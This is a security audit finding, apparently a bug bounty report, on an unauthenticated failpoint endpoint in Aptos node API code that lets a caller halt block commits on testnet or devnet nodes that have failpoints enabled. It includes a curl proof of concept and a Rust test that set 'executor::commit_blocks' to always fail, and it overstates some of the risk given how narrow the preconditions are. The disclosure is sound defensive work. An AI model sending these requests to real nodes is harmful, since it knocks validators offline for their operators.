# Audit Report

## Title
Unauthenticated Failpoint Configuration Allows Node Denial-of-Service and Upgrade Disruption

## Summary
The `/v1/set_failpoint` API endpoint is exposed without authentication, allowing any network attacker with API access to configure arbitrary failpoints that can brick validator nodes, force upgrade rollbacks, or cause critical operation failures on testnet/devnet environments where failpoints are enabled.

## Finding Description

The `set_failpoint_poem()` function in `api/src/set_failpoints.rs` exposes an HTTP endpoint that allows runtime configuration of failpoints without any authentication or authorization checks. [1](#0-0) 

This endpoint is registered in the API router with no authentication middleware: [2](#0-1) 

The only protection is a configuration check (`context.failpoints_enabled()`) which reads from the node config: [3](#0-2) 

While mainnet nodes are protected by a configuration sanitizer that prevents failpoints: [4](#0-3) 

Testnet and devnet nodes commonly enable failpoints for testing purposes, making them vulnerable to this attack.

**Attack Path:**

1. Attacker identifies a testnet/devnet validator node with failpoints enabled
2. Attacker sends unauthenticated GET request: `GET /v1/set_failpoint?name=executor::commit_blocks&actions=100%return`
3. The failpoint is configured to always fail during block commit operations: [5](#0-4) 

4. Node becomes unable to commit any blocks, effectively bricked
5. During a node upgrade, this can force operators to roll back to previous version or perform manual recovery

**Critical Failpoints that can be exploited:** [6](#0-5) [7](#0-6) [8](#0-7) 

The attack is demonstrated in existing tests: [9](#0-8) 

## Impact Explanation

**High Severity** per Aptos bug bounty criteria:
- **Validator node slowdowns**: Can cause complete node stop (worse than slowdown)
- **API crashes**: Can render node completely non-functional
- **Significant protocol violations**: Breaks consensus participation and block processing

**Specific Impacts:**
1. **Node Bricking**: Attacker can configure failpoints on critical paths (execution, commit, consensus) causing permanent node failure until manual intervention
2. **Upgrade Disruption**: During node version upgrades, attackers can target new binary startup or initialization failpoints, forcing rollback and preventing successful upgrades
3. **Network-Wide DoS**: If multiple testnet/devnet validators are targeted simultaneously, could cause network liveness issues
4. **State Corruption Risk**: Triggering failpoints during state checkpoint or ledger update operations could lead to inconsistent state

While limited to non-mainnet networks, testnet and devnet are critical infrastructure for:
- Testing production deployments
- Developer onboarding
- Feature validation before mainnet release

## Likelihood Explanation

**High Likelihood** on vulnerable nodes:

**Preconditions:**
1. Node compiled with `failpoints` feature (common in dev/test builds)
2. Config has `api.failpoints_enabled = true` (explicitly set for testing)
3. API is network-accessible to attacker
4. Node is NOT on mainnet (sanitizer prevents mainnet usage)

**Attack Complexity:**
- **Low**: Simple HTTP GET request, no authentication required
- **Demonstrated**: REST client implementation shows exact usage pattern: [10](#0-9) 

**Real-World Scenarios:**
- Testnet validators often have publicly accessible APIs
- Devnet nodes used for testing frequently enable failpoints
- CI/CD pipelines may inadvertently expose failpoint-enabled nodes

## Recommendation

**Immediate Mitigations:**

1. **Add Authentication**: Require authentication token or allowlist for failpoint endpoint
2. **Restrict Network Access**: Bind failpoint endpoint to localhost-only when enabled
3. **Add Authorization**: Implement role-based access control for failpoint operations

**Recommended Fix:**

```rust
// In api/src/runtime.rs, add authentication middleware
.at(
    "/set_failpoint",
    poem::get(set_failpoints::set_failpoint_poem)
        .with(RequireAuthToken::new()) // Add authentication
        .data(context.clone()),
)

// Add to api/src/set_failpoints.rs
pub struct RequireAuthToken {
    allowed_tokens: HashSet<String>,
}

impl Middleware for RequireAuthToken {
    fn handle(&self, req: Request, next: Next) -> impl Future<Output = Result<Response>> {
        // Verify Authorization header contains valid token
        // Reject if missing or invalid
    }
}
```

**Alternative: Network-Level Protection**
```rust
// In config/src/config/api_config.rs
pub struct ApiConfig {
    // ...
    pub failpoints_bind_address: Option<SocketAddr>, // Separate bind address for failpoints
}

// Bind failpoint endpoint to 127.0.0.1:port only
```

**Configuration Validation:**
```rust
// In config/src/config/config_sanitizer.rs
// Add warning when failpoints enabled with public API binding
if api_config.failpoints_enabled && 
   !api_config.address.ip().is_loopback() {
    warn!("Failpoints enabled with public API binding - security risk!");
}
```

## Proof of Concept

```bash
#!/bin/bash
# PoC: Brick a testnet node with failpoints enabled

# Target node with failpoints enabled
TARGET_NODE="http://testnet-validator.example.com:8080"

# Configure failpoint to always fail on block commit
curl -X GET "${TARGET_NODE}/v1/set_failpoint?name=executor::commit_blocks&actions=100%return"

# Verify failpoint is active
echo "Failpoint configured. Node will now fail on all block commits."

# Monitor node - it should stop processing blocks immediately
# To recover: 
# curl -X GET "${TARGET_NODE}/v1/set_failpoint?name=executor::commit_blocks&actions=off"
# OR restart node with failpoints disabled in config
```

**Rust Test PoC:**
```rust
#[tokio::test]
async fn test_unauthenticated_failpoint_dos() {
    let (swarm, _cli, _faucet) = SwarmBuilder::new_local(1)
        .with_init_config(Arc::new(|_, conf, _| {
            conf.api.failpoints_enabled = true;
        }))
        .build_with_cli(0)
        .await;
    
    let client = swarm.validators().next().unwrap().rest_client();
    
    // Attacker configures critical failpoint
    client.set_failpoint(
        "executor::commit_blocks".to_string(),
        "100%return".to_string()
    ).await.unwrap();
    
    // Node should now fail to commit any blocks
    // Verify node is bricked by attempting transaction
    let result = submit_and_wait_for_transaction(&client, /* ... */);
    assert!(result.is_err()); // Transaction will timeout - node can't commit
}
```

**Notes:**
- This vulnerability does NOT affect mainnet due to configuration sanitizer protection
- However, testnet/devnet are critical infrastructure requiring security
- The lack of authentication is a significant design flaw even for testing endpoints
- Existing tests demonstrate the exact attack pattern used by legitimate testing, showing how trivial exploitation is

### Citations

**File:** api/src/set_failpoints.rs (L22-40)
```rust
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** api/src/runtime.rs (L248-251)
```rust
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** api/src/context.rs (L209-211)
```rust
    pub fn failpoints_enabled(&self) -> bool {
        self.node_config.api.failpoints_enabled
    }
```

**File:** config/src/config/api_config.rs (L177-185)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }
```

**File:** execution/executor/src/block_executor/mod.rs (L236-240)
```rust
                fail_point!("executor::block_executor_execute_block", |_| {
                    Err(ExecutorError::from(anyhow::anyhow!(
                        "Injected error in block_executor_execute_block"
                    )))
                });
```

**File:** execution/executor/src/block_executor/mod.rs (L312-314)
```rust
                fail_point!("executor::block_state_checkpoint", |_| {
                    Err(anyhow::anyhow!("Injected error in block state checkpoint."))
                });
```

**File:** execution/executor/src/block_executor/mod.rs (L345-347)
```rust
        fail_point!("executor::pre_commit_block", |_| {
            Err(anyhow::anyhow!("Injected error in pre_commit_block.").into())
        });
```

**File:** execution/executor/src/block_executor/mod.rs (L383-385)
```rust
        fail_point!("executor::commit_blocks", |_| {
            Err(anyhow::anyhow!("Injected error in commit_blocks.").into())
        });
```

**File:** testsuite/smoke-test/src/aptos_cli/validator.rs (L120-123)
```rust
    rest_client_off
        .set_failpoint("consensus::send::any".to_string(), "100%return".to_string())
        .await
        .unwrap();
```

**File:** crates/aptos-rest-client/src/lib.rs (L1626-1643)
```rust
    pub async fn set_failpoint(&self, name: String, actions: String) -> AptosResult<String> {
        let mut base = self.build_path("set_failpoint")?;
        let url = base
            .query_pairs_mut()
            .append_pair("name", &name)
            .append_pair("actions", &actions)
            .finish();
        let response = self.inner.get(url.clone()).send().await?;

        if !response.status().is_success() {
            Err(parse_error(response).await)
        } else {
            Ok(response
                .text()
                .await
                .map_err(|e| anyhow::anyhow!("To text failed: {:?}", e))?)
        }
    }
```
